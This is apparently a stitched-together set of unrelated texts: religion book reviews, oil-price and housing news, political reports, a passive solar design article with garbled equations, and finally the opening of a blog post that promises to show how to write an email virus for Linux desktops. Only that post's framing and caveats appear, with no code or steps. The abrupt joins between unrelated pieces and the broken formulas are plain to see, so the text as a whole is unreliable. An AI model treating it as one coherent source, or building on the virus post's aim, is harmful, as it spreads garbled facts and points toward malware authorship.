Trachtenberg is as humble as he is nimble , and both qualities are prerequisites for his inquiry - or rather , set of inquiries , since the book is framed as “ Five Questions about Suffering and Its Meanings . ”
It might as easily have been subtitled “ Five Hypotheses , ” since in each chapter Trachtenberg not only addresses a different facet of suffering but also a variation on religion ’s or philosophy ’s or law ’s responses , drawing on Gilgamesh , Boethius , Buddha , Simone Weil , and many others , always respectfully , never conclusively .
“ This book is an investigation of the ways people find meaning in suffering , ” he writes , “ or try not to be driven mad by the possibility that it means nothing . ”

One of my favorite books of last year was Hanna Rosin ’s God ’s Harvard : A Christian College on a Mission to Save America ( Harcourt ) , which I described then as “ the first work of genuine literary journalism about Christian fundamentalism and politics .
Rosin follows it up this year by collaborating with photographer Jona Frank , who gives us the astonishing Right : Portraits from the Evangelical Ivy League ( Chronicle ) .
What made God ’s Harvard great was Rosin ’s deep understanding of not just the conservative politics of the college but also the personal politics of its students , such as the young fundamentalist women who must choose between the ankle - length “ prairie skirts ” they consider appropriate for Christian women and the more modern dress that will allow them to more effectively champion their causes in the halls of power .
Frank ’s calm , respectful , portraits reveal that dilemma without words , such as this photograph of a young woman yet to cross the hemline divide .

Sharman Apt Russell went back to the land , moved into town , wandered into the desert again , and literally kept reading every step of the journey , her nose in a book as she explored the mesas and riverbeds of New Mexico .
The result is Standing in the Light : My Life as a Pantheist ( Basic Books ) , a meditation on philosophy as a practical concern and the desert landscape as a spiritual calling .
Apt Russell calls her religion Pantheism ; I call it beautiful prose , filled with wisdom and populated by songbirds , heretics , wild pigs , philosopher - kings , and cottonwood trees .

In God ’s Profits ( Polipoint ) , journalist Sarah Posner follows both the money and the beliefs of a crew of the nation ’s sleaziest snake oil salesmen to produce a horrifying but important story .
Posner knows which side she ’s on - this is hard - hitting lefty journalism - but God ’s Profits is a book that anyone who wants to understand how good and honest people are seduced into movements led by theological sham artists needs to read .
Of particular value is Posner ’s reporting on Rod Parsley , a rising star of “ populist ” fundamentalism .
This is fast - paced , fearless muckraking of the first order .
My one complaint : God ’s Profits is burdened with one of the dullest covers of the year , which probably explains in part why this book was n’t the hit it should have been in liberal / left circles .
Polipoint , a new small press , has done a nice job of producing timely work that evokes the early American pamphlet tradition at its best ; now they need to bring that same vigor to their packaging .

Mike Mignola ’s Hellboy books are bundled up every year into “ graphic novels ” that make them almost acceptable for literary folk , if you can get past the fact that the hero is a big red devil .
But for the real thing , stop by your local geek palace comic book store and buy Mignola ’s three - book Hellboy series “ The Crooked Man , ” ( Dark Horse Comics ) with art by Richard Corben .
Set in an Appalachian hollow in 1958 , it ’s a riff on an old folktale about a satanic emissary called the Crooked Man .
Our hero , Hellboy , is there to help a man who ’s sold his soul bury his father in sacred ground .
That summary does it no justice - it ’s one of the scariest stories of any genre I encountered all year , loose with its folkloric roots but as evocative of the fear and humor of Southern folk religion as Flannery O’Connor .
Only , the “ ragged figure moving from tree to tree ” off in the dark is n’t Jesus , it ’s a demon with rolling eyes , a neck beard , and the spookiest grin in pulp literature .

“ Sometime in 2003 the bottom fell out of sex in America , ” writes historian Dagmar Herzog , commenting on media narratives about sex in Sex in Crisis : The New Sexual Revolution ( Basic Books ) .
According to the press , Americans were having less sex than in recent decades - or maybe they were feeling more anxious about it .
Why ?
Herzog argues that while the religious right has lost nearly every individual battle it ’s fought over sexual freedom , it has subtly won an ideological war .
“ The religious right succeeded in setting the terms of conversation about sex in the United States , ” writes Herzog , “ not least because it adapted aspects of the old sexual revolution , as well as of the feminist and men ’s movements of the 1960s to 1980s , for its own sexually conservative ends . ”

Religious album of the year : The Chemistry of Common Life , by Fucked Up. Pitchfork says this album “ could possibly revitalize hardcore . ”
I think it might give the New Atheism some much - needed soul .
There ’s lotsa roaring guitar , some trippy sound effects , backup singers , and some surprisingly pretty rock flute a la Jethro Tull , but the emotional heart of the album is lodged in the metal grater that passes for singer Pink Eyes ’ larynx .
It ’s a fascinating instrument , but do n’t let the lyrics pass you by .
In songs like “ No Epiphany ” and “ Royal Swan , ” the band wrestles seriously with faith , acknowledging its allure as well as its absence .
In “ Son the Father , ” Pink Eyes points out that “ It ’s hard enough being born in the first place , ” and logically asks , “ Who would ever wanna be born again ? ”
Customer : What ’s the difference between this - ” * holds up a steak of lamb * “ and this ? ” * holds up a steak of calf *
Me : “ Well , this one is from a lamb , and this one from a calf .
It says so right here on the label . ”
Customer : “ But what part of the animal is that ? ”
Me : * points at the lamb * “ Baaaa . ” * pointing at the calf * “ Moooo . ”
Customer : * happily * “ Oh , thank you so much ! ”
NEW YORK ( CNNMoney.com ) --
Oil prices dipped a bit Wednesday after the government 's weekly supply report and fresh recession concerns continued to chip away at demand .
Light , sweet crude for February delivery dropped 50 cents to settle at $ 37.28 a barrel , a three - week low .
Oil endured volatile trade throughout the day , moving as low as $ 35.52 and as high as $ 39.45 in the session .
" There are so many dynamics facing the oil contract , " said Rachel Ziemba , oil analyst at RGE Monitor .
" Lots of attention is being paid to inventories , financial markets and macro economics , and oil is likely to continue be very volatile with the dollar swaying like it is . "
The government 's weekly supply report showed that demand for gasoline continued to be well below that of the same time last year , as was the demand for distillates , which are used to make heating oil , among other products .
The government report " underscores the fact that we are awash in oil right now , " said James Cordier , portfolio manager of OptionSellers.com .
" Not only is demand so poor because of the economic crisis , " he added , but there is excess supply .
With slowing demand and a bottleneck of supply , " it is very difficult for the market to sustain any kind of a rally , " said Cordier .
Neal Dingmann , senior vice president at Wunderlich Securities , echoed the sentiment .
" Typically , these low prices would spur demand , and we are not seeing that as we see more negative news roll out , " he said .
The question in the oil market now , according to Dingmann , is what price does it take for " that incremental demand - either retail or industrial - to begin to come back ? "
Meanwhile , grim retail sales reports released Wednesday showed consumer weakness , pulling the Dow Jones industrial average down as much as 300 points .
The recession has caused crude oil prices to fall off for months .
Crude prices hit a peak of $ 147.27 a barrel in midday trading on July 11 .
Since then , demand for crude oil has steadily fallen off , bringing prices with it .
Supply report :
In its weekly inventory report , the Energy Information Administration said stockpiles of gasoline increased by 2.1 million barrels .
Analysts were looking for a build of 1.8 million barrels , according to a consensus estimate of industry analysts surveyed by Platts , a global energy information provider .
Gasoline stockpiles were in the upper half of the average range for this time of year .
Retail gas prices were significantly off their summer highs .
But even as the pain at the pump eased , drivers were cutting back on their miles on the road .
According to the report , gasoline demand has averaged 8.9 million barrels per day over the last four weeks , down by 2.1 % from the same period a year earlier .
Crude stocks increased by 1.2 million barrels in the week ended Jan .
9 . Analysts were looking for a more substantial build of 3 million barrels of oil .
At 326.6 million barrels , oil inventories were above the upper limit of the average range for this time of year .
Distillates , used to make heating oil and diesel fuel , increased by 6.4 million barrels and were above the upper limit of the average range for this time of year .
Analysts were looking for a much more modest increase of 1.7 million barrels in distillates .
Even as winter cold sets in and demand for heating oil should be rising , demand for distillates was much lower than last year .
According to the report , over the last four weeks , distillate fuel demand has averaged about 4.1 million barrels per day , 2.4 % below the same period last year .
" The report today showed a huge build in heating oil supplies at a time when you should expect them to drop , " said Cordier .
With most of the country in the midst of winter , demand for distillates should be at its high point .
Cordier said that the significant drop in distillate use during the winter months also indicates a slowdown in other sectors that use distillates , such as factories and transportation .
The other component of distillate fuel is diesel fuel , which is used to power trucks and factories .
Refineries were still pumping , however .
Refineries process raw crude oil into usable products like gasoline and distillate oil .
Last week , refineries operated at 85.2 % of their operable capacity , which was higher than the 83.7 % capacity analysts were expecting .
Recession talk : Fresh signs of the global recession also weighed on oil prices .
Each sign that the economy slows down chips away at demand for oil , and that weighs on the price of crude .
" The health of the economy is a huge factor in determining what kind of consumption we will have in the future , " said Cordier .
The Commerce Department reported Wednesday that retail sales fell 2.7 % in December , more than twice what economists had expected , according to a survey conducted by Briefing.com .
The drop off represented the sixth month in a row of monthly declines and was an indication that the cash - strapped consumer was not spending .
Additionally , what is largely expected to be a batch of dismal fourth - quarter corporate results lies ahead .
And with Citigroup 's plans to merge its Smith Barney brokerage division with that of Morgan Stanley , fresh signs of unrest in the financial sector made investors jittery .
Saudi talk :
On Tuesday , however , oil prices rose 19 cents to settle at $ 37.78 a barrel , ending a five - day streak of losses , as Saudi Arabia announced it would cut production levels .
Ali al - Naimi , Saudi Arabia 's oil minister , said Tuesday his country plans to cut its oil production levels even below its previous target , according to Reuters .
" Saudi Arabia is jawboning , " said Cordier , " talking about cutting production even further . "
But he also added that OPEC 's ability to manipulate oil prices has diminished .
The Organization of Petroleum Exporting Countries ( OPEC ) , which controls 40 % of global oil supplies , has been trying to support prices by also limiting supply to the market .
Retail gas prices : Meanwhile , retail gas prices increased Wednesday .
Prices at the pump hit a record low just before the new year , and have mostly been trending higher since then , according to a daily national survey of gas station credit card swipes .
The price of gas rose to a national average of $ 1.792 a gallon , up from $ 1.790 the day earlier , motorist group AAA reported on its Web site .
Gas prices hit a record high of $ 4.1144 a gallon on July 17th and then fell throughout the fall to hit a low of $ 1.6160 a gallon on December 30 .
The fall off in retail gas prices came on the back of sharply declining crude oil , which fell more than $ 100 a barrel from its summer peak to current levels .
Three states currently have gas prices above $ 2 a gallon : Alaska , Hawaii , and California .
And the cheapest gas is in Wyoming , where a gallon cost $ 1.460 , according to AAA .
The AAA figures are statewide averages based on credit card swipes at up to 100,000 service stations across the nation .
This is Part 2 in a series on passive solar by Oil Drum reader Will Stewart .
Passive solar is one of many practices attempting to increase the percentage of our baseline energy use we receive from renewable flows as opposed to fossil stocks .
Passive Solar Design Overview - Part 2
Passive Solar Design Overview – Part 2
In Part 1 of this series , we looked at the three main architectural styles of passive solar design ( Direct Gain , Indirect Gain , and Isolated Gain ) , as well as the first of the five design aspects , Aperture .
This article will address the next design aspect , Absorber , at an overview level , beginning with a short introduction in heat transfer basics , so that the reader understands the fundamentals of building heat gain and loss , all of which are as equally important for renovation as they are for new construction .
Conduction : Transfer of heat energy resulting from differences in temperature between contacting adjacent bodies or adjacent parts of a body ( i.e. , put your hand on a warm stove ) .
Heat travels through walls via conduction .
Convection :
The natural tendency for a gas or liquid to rise when it comes in contact with a warmer surface ( i.e. , gliders and soaring birds seek rising thermals over sun-drenched land surfaces ) .
For example , interior air will convect upwards from warm thermal mass areas and downwards alongside cool window or wall surfaces .
Radiation :
When one object warms a cooler non-contacting object ( i.e. , what you feel on your face as you sit in front of a fire or on a sunny beach ) .
Hotter objects will transfer heat to cooler objects within direct line of sight .
A person standing near a warm thermal storage mass will feel more comfortable than standing near a poorly insulated wall or window .
Heat can be transferred from one mass to another by ;
Figure 5 shows how these heat transfer types are experienced by windows ( and walls , except for transmitted radiation ) .
Figure 5 - Heat Transfer by Conduction , Convection , Radiation , and Infiltration
Building Heat Losses
We need to have a short primer in thermodynamics ( do n't worry , this will be relatively simple ) .
First , we have to discuss units of heat .
In the English system used by the US , a British Thermal Unit ( BTU ) is the amount of heat energy needed to raise the temperature of one pound of water by one degree F .
In the SI system ( rest of the world ) , joules and kilowatt - hours are the measure of heat energy ( 1055 j = 1 BTU and 1 kilowatt - hour = 3412 BTUs ) .
Next , we look at heat energy used over time .
If we burn a bunsen burner for one hour ( assuming no heat loss ) , raising the temperature of 1 pound of water 20 degrees , then the heat energy rate is 20 BTU / hour .
In order to determine how much solar heat input and thermal storage we will need , we must understand the heat losses of the building under design ;
Q loss = ( Σ ( UA ) n + C v ) ( t i - t o )
loss
2

v
i
o
where := BTU / hr or kWU = 1/R- value ( , see R-values of common materials A = area ( ftor mn = exterior building surfaces ( all walls , windows , ceilings , floors ) = infiltration losses ( see Architect 's Handbook ) [ 1 ] = desired indoor temperature= outdoor temperature , normally the coldest in the 97.5 percentile ( 2.5 % of the time is colder )
Building Heat Gains
Now that we know how much heat is being lost by a building , we can determine how much heat we need to collect .
From Part 1 , we understood how much energy could be received by our aperture .
Let 's size our aperture now ( with rough calculations ) to balance out the losses ;
Q gain = ( Σ ( ( Q insolation + Q diffuse + Q reflected ) A ) n SHGC + Q other
gain
insolation

diffuse
reflected
other
where := BTU / day or kWh / day= BTU / ft / day or kWh/m / day from table in Part 1 = ( normally a part of the empirical insolation data , more at NREL = insolation energy x surface reflectivity ( rough estimate , more at NREL n = each window facing the equator ( cooling calculations must account for east and west windows ) SHGC = Solar Heat Gain Coefficient=
Heat from people and various powered devices inside the insulated shell [ 2 ]
So in order for our building to have sufficient heat input , the daily gains must equal the hourly losses over a 24 hour period , on average , centered around the desired temperature .
On cloudy days , the deficit is made up by extra thermal mass ( see below ) , backup heating , or increasing layers of thermal underwear .
Note that backup heating could be an active solar heating system with a small collector array and a large storage tank that collects and stores heat on sunny days for use on cloudy days .
An important point to note : the higher the R - value and lower the area of the walls and windows , the less energy is lost through them , hence less sunlight ( windows ) and thermal mass are needed to achieve and maintain the desired temperature range .
That 's why superinsulation techniques ( e.g. , R - 50 strawbale walls , minimal thermal - bridging wall components ) and space efficiency are commonplace in passive solar design ( compared to 6 " R - 19 walls or 4 " R - 13 walls , for example ) .
Strawbale walls have far lower embodied energy than concrete , so are highly attractive from an EROEI standpoint .
Due to its significant breadth , the subject of energy efficient building techniques will be the subject of another article .
Absorber
Figure 6 - Solar Intensity at Sea Level by Wavelength
The absorber in a passive solar implementation is the surface that receives the sunlight ( direct or reflected ) , converting the visible light and infrared spectrum energy into heat .
Figure 6 shows the light spectrum energy density that penetrates the atmosphere .
Note that the most intense radiation comes from the visible light spectrum between 400 and 700 nm , though substantial amounts are also available in the infrared spectrum ( if not substantially blocked by low - E glass ) .
Hence , an appropriate absorber in a passive solar design will convert as much of this impinging spectral energy into heat as possible .
The measure of how well the absorber captures the radiant energy is referred to as the absorptivity .
The higher the absorptivity , the less energy is reflected away ( see Table 1 for properties of common materials ) .
Once the sun 's energy is captured by the absorber , it can also be re-radiated in the infrared spectrum to cooler objects ; the measure of this re-radiation is called emissivity .
For direct gain homes where a thermal storage floor is heated , emissivity is not much of a concern , as the heat is radiated into the room ( if the people or objects in the room are cooler ) .
In situations where the absorbing surface faces external surfaces with little insulating value ( i.e. , windows ) , the re-radiation loss is a reduction in energy efficiency and should be minimized as much as possible .
Some materials or treatments have much higher absorptivity values than emissivity values ; these are called selective , and are also used quite frequently in solar thermal collectors for hot water and active solar heating .
Many materials have varying values of absorptivity and emissivity depending on the temperature and spectral wavelength , so the values listed are averaged out for the integral of the solar intensity by spectrum shown in figure 6 .
See this list for more materials .
Material Absorptivity Emissivity
White tile / stone / paint 0.30 - 0.50 0.85 - 0.95 Unfinished concrete 0.65 0.87
Red brick / stone / paint 0.65 - 0.80 0.85 - 0.95 Flat black paint 0.96 0.87 Copper Oxide 0.90 0.17 Black nickel 0.90 0.08
Black chrome- coated
copper foil 0.95 0.11
In Part 3 , we 'll cover how to select and size thermal mass in order to even out the swings in outside temperature and internal solar gain .
Future articles in the series will be devoted to distribution , controls , renovation , design tools , green building standards , case studies , and more .

DENVER ( Reuters ) - President - elect Barack Obama ’s transition team will kick - start the process of healthcare reform with a series of meetings across the country , modeled on those his campaign held last summer .
“ Providing quality affordable health care for all Americans is one of my top priorities for this country because our long - term fiscal prospects will have a hard time improving as long as sky - rocketing health care costs are holding us all down , ” Obama said in a statement on Friday .
“ Yet in order for us to reform our health care system , we must first begin reforming how government communicates with the American people , ” he said .
“ These Health Care Community Discussions are a great way for the American people to have a direct say in our health care reform efforts and I encourage Americans to take part if they are able . ”
Former Senate Democratic leader .
Tom Daschle , Obama ’s choice for Health and Human Services Secretary , said the meetings would start on December 15 and run through December 31 , before the new president is inaugurated on January 20 .
Obama ’s Internet site www.change.gov asks people to submit ideas for changing America ’s costly and inefficient healthcare system , which leaves tens of millions uninsured .
Speaking at a meeting of healthcare industry experts in Denver , Daschle said he would like to “ allow the states to be workshops and laboratories of innovation . ”
‘ DETAILS KILL ’
Daschle said past efforts to reform the U.S. healthcare system got bogged down in details and said he would fight against long , wordy bills .
“ Details kill , ” he told the meeting .
“ Once we get started , let ’s finish and not languish . ”
Politicians , labor unions , health insurers , doctors and the general public agree the United States needs to reform its healthcare system , the most expensive in the world .
Close to 46 million Americans have no health insurance , and Americans are more likely to die of common diseases than people living in many other developed countries .
“ The myth is that we have the best healthcare system in the world .
We do have islands of excellence in a sea of mediocrity , ” Daschle said .

Unions and consumer groups welcomed the approach .
“ Clearly , any solution must expand coverage , reduce costs , and improve quality -- the very priorities spelled out by Senator Daschle in Denver today , ” DeAnn Friedholm of Consumers Union said in a statement .
“ This strategy of getting out of Washington and engaging real people will help overcome the vested interests that have stood in the way of reform for way too long , ” added Dennis Rivera of the Service Employees International Union , which represents healthcare workers .
During the campaign , Obama pledged to bring health insurance to millions of uninsured Americans and spend about $ 50 billion to make U.S. health records electronic .
Many health reform advocates believe Obama will need broad public support to overhaul an industry that has become among the most intractable of U.S. political problems .
When she was first lady during her husband Bill Clinton ’s first term as president , New York Sen.
Hillary Clinton failed to push through a healthcare reform plan .
U.S. healthcare costs now account for about 16 percent of U.S. gross domestic product -- or $ 2.3 trillion -- a proportion projected to grow to 20 percent or $ 4 trillion by 2015 .
Obama has nominated Elena Kagan , dean of Harvard Law School , to become the 46th solicitor general .
Is solicitor hearing a trial balloon ?
With the revelation last week that Supreme Court Justice Ruth Bader Ginsburg is suffering from pancreatic cancer , the political stakes for Tuesday ’s Senate Judiciary Committee hearing on the next solicitor general were raised dramatically .
President Barack Obama has nominated Elena Kagan , dean of Harvard Law School , to become the 46th solicitor general since the office was established in 1870 and the first woman to hold the post .
As solicitor general , Kagan would represent the U.S. government before the Supreme Court .

While her confirmation is widely expected by both sides , Democrats and Republicans consider the fight over Kagan ’s nomination to be a dry run for a future Supreme Court nomination battle .
Not only is Kagan , 48 , on many short lists for a Supreme Court appointment ; when the Judiciary Committee considers her nomination for solicitor general , it will preview many of the same legal and constitutional issues that the Obama administration must confront : detainee rights , interrogation practices , criminal law , voting rights , the reach of presidential power during wartime and the limits of executive privilege .
Four solicitors general have gone on to serve on the Supreme Court , and one — William Howard Taft — is the only person to serve as both president and Supreme Court justice .
Sen. Orrin G. Hatch ( R - Utah ) called Kagan “ brilliant ” and said she has been “ a very good dean ” at Harvard Law School for the past six years .
Asked whether her confirmation hearing could be a preview for a future nomination to the high court , he said , “ I think that ’s probably accurate . ”
“ There ’s no doubt in my mind that she would be high in their pecking order , ” Hatch said .
“ But they ’ve made such a fuss about the need to have judicial experience , and she ’s had absolutely none .
Has she had any experience arguing before the Supreme Court ?
Not that I know . ”
Hatch ’s comments on Kagan ’s lack of judicial experience may seem ironic to Senate Democrats ; as Judiciary Committee chairman , he declined to schedule a hearing on Kagan ’s 1999 nomination to the U.S. Court of Appeals for the D.C. Circuit by former President Bill Clinton , thus killing the nomination .
“ This has a lot of the same issues that you would see in a [ Supreme Court ] fight , ” said a senior Democratic aide , speaking on the condition of anonymity .
“ There is definitely a chance that Kagan could be someone Obama nominates if he gets a chance .
Her credentials easily qualify her to be in that mix . ”
Kagan , a New York City native , graduated from Princeton University in 1981 , then earned a master ’s in philosophy from Oxford before attending Harvard Law School .
After completing law school , Kagan clerked for the late Supreme Court Justice Thurgood Marshall , worked in the White House counsel ’s office and served as a policy aide for Clinton prior to her unsuccessful nomination to the federal bench .
The principal attack on Kagan has come from her opposition to allowing military recruiters on college campuses .
In 2003 , she joined dozens of other legal scholars in supporting a challenge to the Solomon Amendment , a Clinton - era law named after the late Rep. Gerald Solomon ( R - N.Y. ) , mandating that military recruiters be allowed on campus if that school accepts federal funds .
The Supreme Court eventually ruled unanimously in favor of the law .
An editorial in The Washington Times claimed that Kagan ’s nomination “ smacks of special interest , aimed at protecting the Ivy League ’s out - of - touch elitism at the expense of students , taxpayers and our military alike . ”
And the National Review , a leading conservative magazine , questioned whether Kagan ’s views on the Solomon Amendment placed her “ far out of the judicial mainstream , ” and further asked if she would support the “ do n’t ask , do n’t tell ” policy for gays in the military .
“ Where she does get into some difficulty is some of her writings in the past , some of her statements in the past [ that ] have caused some real angst among some people , ” Hatch said .
Yet Kagan has won plaudits from top legal experts in both parties , including eight of her predecessors as solicitor general .
That list includes Kenneth Starr and Theodore Olson , both legal icons for the right wing .
The deans of 10 top law schools also have endorsed Kagan , as did Miguel Estrada , a Bush nominee for the D.C. appeals court whose nomination Democrats blocked in 2003 .
Judiciary Committee Chairman Patrick Leahy ( D - Vt. ) said Republicans on his panel “ should be shamefaced ” for blocking Kagan ’s nomination a decade ago .
But Leahy did n’t want to discuss the possibility of replacing Ginsburg or any other Supreme Court justice .
Like other lawmakers from both parties , Leahy said he “ prayed for Justice Ginsburg ’s quick recovery . ”
The Vermont Democrat also complained about Republican bashing of Eric Holder and David Ogden , Obama ’s picks for attorney general and deputy attorney general , as well as Dawn Johnsen , the president ’s choice to head up the Office of Legal Counsel within the Justice Department , and Thomas Perrelli , selected to be associate attorney general .
Holder has been confirmed by the Senate , while Ogden , Perrelli and Johnsen have yet to be voted upon .
“ I do n’t even look at these as dry runs , ” Leahy said .
“ You have Eric Holder , looking at the last attorney generals , by far the most qualified .
These people are highly qualified .
I do n’t understand why the Republicans are trying to hold them up when they rushed through people far less qualified . ”
Leahy was referring to the Judiciary Committee ’s approval of Bush nominees while the panel was under GOP control .
Oh god that pun in panel four is STILL making me groan .
It feels good to be back in Massachusetts in front of the ol ' Cintiq again !
Time to go home and unpack , see you tomorrow .
NEW YORK ( CNNMoney.com ) --
The real estate market is so awful that buyers are now scooping up homes for as little as $ 1,000 .
There are 18 listings in Flint , Mich. , for under $ 3,000 , according to Realtor.com .
There are 22 in Indianapolis , 46 in Cleveland and a whopping 709 in Detroit .
All of these communities have been hit hard by foreclosures , and most of these homes are being sold by the lenders that repossessed them .
" Foreclosures have turned banks into property management companies , " said Heather Fernandez , a spokeswoman for Trulia.com , the real estate Web site .
" And it 's often cheaper for them to give these homes away rather than try to get market value for them . "
In Detroit for instance , Century 21 Villa owner Randy Eissa has a three - bedroom , one - bath bungalow of about 1,000 square feet listed at just $ 500 .
It 's a nice place with lots of light , but it needs a total rehabilitation inside , which Eissa estimates will cost between $ 15,000 and $ 20,000 .
But that 's not bad , considering that the home last sold for $ 72,000 in late 2007 , according to Zillow.com .
With prices this low , lenders are n't looking to make any money on these deals .
They just want to get these houses off their books , so they do n't have to bear the cost of maintaining them and paying property taxes .
In fact , the $ 500 , $ 1,000 or $ 3,000 that a buyer forks over often goes straight to the real estate brokers as a commission .
And often the lenders have to kick in extra cash to make it worthwhile for a realtor even take the listings , according to Eissa .
" Usually these homes are bank repossessions that the lenders have already tried to sell on the market , perhaps then put up for auction without success and then re-listed , " he said .
Fixer uppers
These houses are almost always small fixer - uppers .
Wiring , plumbing and heating systems have to be replaced , walls and ceilings sheet - rocked , plumbing and light fixtures installed and new kitchen cabinets and counters put in .
Few come with working appliances .
Often buyers are legally required to rehab these homes to bring them up to code .
In Detroit , buyers are required to sign Affidavits of Compliance Responsibility , which obligates them to make repairs outlined in an inspection report .
Only after that can a certificate of occupancy will be issued , which makes the house legal to live in .
But even factoring in these costs , they 're still bargains .
And as the housing crisis drags on , there are more and more four - figure listings popping up , as lenders try to unload their repossessed properties .
Cleveland is another city with many incredibly inexpensive homes .
On Ardenall Avenue , in East Cleveland , McMullen Realty has a listing for a four - bedroom , one - and - a - half bath house for $ 1,900 .
It 's been vandalized inside , but the outside is in good shape .
It features a deep front porch with Doric columns , double dormer windows and a separate garage .
It 's an excellent opportunity , according to agent Tonya Stoudamire .
The last time it sold was in March of 2008 when it went for $ 16,677 , according to Zillow .
" East Cleveland has a beautiful housing stock , " she said .
" These houses just need someone to come in and love them a little . "
Another property for sale in Birmingham Ala. is priced at $ 1,900 .
The one - bedroom , one bathroom home was built in 1923 and has major fire damage , according to its listing broker , Tom Murphy Realty .
The listing states that " Rooms are hard to distinguish . "
But it's on a nice - sized lot , about 0.38 acre , close to downtown and transportation and has all utilities .
Nearby , comparable homes in good condition sell for about $ 100,000 , according to Zillow .
Rehab money
Most of these $ 1,000 homes can be renovated relatively inexpensively , and buyers can actually get government help to finance these repairs .
The U.S. Department of Housing and Urban Development ( HUD ) has a special loan program for just such purchases .
Its rehabilitation mortgage insurance , available through FHA - approved lenders , was designed to encourage banks to issue a single , long - term loan to buyers that covers both the acquisition and rehabilitation of a property , according to HUD spokesman Brian Sullivan .
He adds that there may also be grant money available from the $ 4 billion Neighborhood Stabilization Program , which was a part of the massive housing rescue bill passed by Congress in July , to assist buyers with grants for down payments .
Buying homes like these is certainly a leap of faith ; they 're generally not in the best of neighborhoods and they 're often surrounded by many other vacant and deteriorating homes .
Still , some of these neighborhoods may turn around and provide residents with good , dirt - cheap housing .
" It 's a sad time , " said Stoudamire .
" But it 's also a time of opportunity , especially for low and moderate income people . "
State Sen.- elect Hiram Monserrate flew into a volcanic rage and attacked his girlfriend after seeing another man ’s business card in her purse , sources told The Post yesterday .
The law - enforcement sources also believe that the jealous Monserrate was so angry that he deliberately broke a glass into jagged pieces so he could slash Karla Giraldo , who required 20 stitches around her left eye following the alleged domestic - violence assault .
Sources said her wound is consistent with a jagged piece of glass tearing into her skin .
Investigators have seen the business card and who it belongs to and consider it potential evidence in the case .
Meanwhile , it was revealed that a top aide to Senate Democratic Leader Malcolm Smith showed up at the police station to offer assistance to Monserrate , a fellow Democrat , on the morning he was busted .
Smith ’s office confirmed that Chief of Staff Mortimer Lawrence – a former Queens assistant DA – went to the 105th Precinct station house in Queens Village to help Monserrate , but insisted Smith did not direct him to do so .
“ [ Lawrence ] was there on his own volition to see how he could help an incoming member of the Senate , ” said Smith spokesman Austin Shaffran .
“ He did not do anything to try to intervene on Mr. Monserrate ’s behalf .
He did not speak to Monserrate at the precinct .
Nor was his appearance at the direction of Senator Smith , ” Shaffran said .
He added that Lawrence showed his credentials as a lawyer , not as a Senate staffer .
Critics said Lawrence ’s effort to aid an accused domestic batterer was wrong .
“ Give me a break .
This guy is a former Queens prosecutor .
This is unethical and inappropriate , ” fumed state Sen. Marty Golden ( R - Brooklyn ) .

Parash Hill , a nature reserve in southern Israel , is a great spot for a picnic .
With lush green fields and a view all the way to the Mediterranean , it is a serene and picturesque place where residents of Sderot come to quietly enjoy nature .
But in a nation obsessed with the glories of its latest military adventure , Parash Hill is now a place for Israelis to gather and watch the death unfold .
They come with binoculars .
They bring their families and take pictures .
They rationalize away the deaths of hundreds of children by reasoning that “ when they grow up they ’ll also probably be terrorists . ”
Its like the fourth of July , only instead of watching fireworks and listening to crappy instrumental music on the radio they watch with barely restrained jubilation as their neighbors are killed under a heavy military bombardment and ground forces continue to pour deeper into the Gaza Strip .
The obsession with watching the violence unfold in the Gaza Strip is creeping - out even some of their fellow Israelis , who have dubbed the site “ The Hill of Shame ” and watch disapprovingly as others participate in Israel ’s newest spectator sport .

Delivery , fail .
Expecting to find a box of tools he had ordered , one north Texas man found 30 pounds of marijuana .
Street value : $ 10,500 .
" I personally have not seen that much , " Denton police officer Ryan Grelle said .
" This is the first time I 've seen roughly 30 pounds of marijuana . "
Investigators said the recipient immediately drove the drugs to Denton police headquarters .
" The man came up and said something like , ' I just want to talk to an officer and do n't want to talk to anyone else until I talk to an officer , " Grelle said .
According to police , the box was sent from Pharr in south Texas and made its way through Austin , Mesquite , Dallas and then Denton .
" UPS tried to deliver to the Dallas address , but the person sending it put down a street that does n't exist , " Grelle said .
Detectives said they believe UPS diverted the package to a street with a similar name in Denton .
UPS spokeswoman Susan Rosenberg said UPS works with law enforcement on drug cases .
She said the shipping company scans some of its shipments but could n't divulge what technology is used because of security reasons .
Denton police said they 've turned over information on the shipping address to narcotics officers .
The man who turned the marijuana in does not face criminal charges .

The rumor of the bullet - proof Linux architecture
There is this rumor going around that Linux is virus free .
It is said that the old - fashioned multi-user heritage of Linux ( and other * nix OSs ) prevents malware , since users are not normally running their programs in admin mode ( as root user ) .
We are reminded that execute bits are needed to run anything – contrary to Windows – and that execute bits are n't set on any attachments or files saved from emails or from a web - browser .
Therefore , we are told , the very architecture of Linux is so much more superior to Windows that it 's just not possible to successfully spread malware .
Of course – it is acknowledged – a low - level bug , a buffer overflow or other issue is exploitable .
But nevertheless , users can't just catch a virus by email or downloading malware from the Internet , contrary to “ those Windows users ” .
Linux will protect them from their own stupidity .
At least so the story goes .
But sadly , that 's not true .
I will show how it is possible in a few easy steps to write a perfectly valid email borne virus for modern desktop Linux .
I will do so not because I want to put down Linux .
Quite the opposite : I like and support Linux , which is all I 'm running at home and at work .
I 'm a big supporter of free and open software as readers of this blog will know .
But if there are any security risks , even in my favorite OS or distribution then they will need to be discussed .
Even more important : A false sense of security is worse than a lack of security .
And unsubstantiated claims of superiority do n't help in a reasonable discussion either .
Some notes before we get started
Update :
There has been a lot of feedback about me using the term ' virus ' not correctly here .
That I should talk about a ' trojan horse ' instead .
There is some disagreement on whether a virus requires user interaction or not , and whether we would be talking about a worm if we are talking about malware that can spread without user interaction .
There is also some disagreement on whether a malware that spreads itself via email can be considered a virus or not .
There are many sources that would call such a thing a virus ( an ' email virus ' ) and others which would be more exacting in their definition .
Let this article not be about that discussion .
I 'm calling this malware here a ' virus ' , even though it does require user interaction and even though I do n't provide actual code for how to spread itself ( that code is only provided as very high - level pseudo - code ) .
I should point out :
The vulnerabilities we will be taking advantage of are ' features ' of the most popular modern Linux desktop environments , Gnome and KDE .
The actual core of Linux itself does not have any of these vulnerabilities .
A Linux ( or any other * nix ) system without running Gnome or KDE will not exhibit any of these problems , which is one of the huge advantages of properly separating the core OS from other applications such as the desktop environment .
On the flip side , if you run those desktop environments on other OSs ( maybe on FreeBSD , for example ) then you possibly have to deal with the same vulnerabilities .
A more accurate title for this email therefore might have been :
How to write a Gnome / KDE virus in 5 easy steps .
But since Gnome and KDE are predominantly used under Linux , I feel that a virus based on those vulnerabilities would impact Linux users the most .
Thus , the chosen title remains valid .
The text of this article here will explain to you which steps need to be taken to infect a desktop and how to install your malware and will provide background information on why those steps are necessary and why they actually work .
After the longer explanation there is a more compact step - by - step summary towards the end .
